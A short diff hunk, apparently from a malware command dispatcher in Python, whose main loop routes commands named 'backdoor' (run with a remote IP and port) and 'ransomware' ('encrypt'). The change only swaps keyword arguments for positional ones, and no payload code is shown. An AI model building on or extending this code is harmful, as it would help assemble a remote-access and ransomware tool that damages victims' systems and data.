@@ -79,7 +79,7 @@ def main():
 
             elif result[0] == "backdoor":
                 if len(result) >= 3:
-                    backdoor.run(remote_ip=result[1], remote_port=result[2])
+                    backdoor.run(result[1], result[2])
 
             elif result[0] == "ransomware":
                 if result[1] == "encrypt":
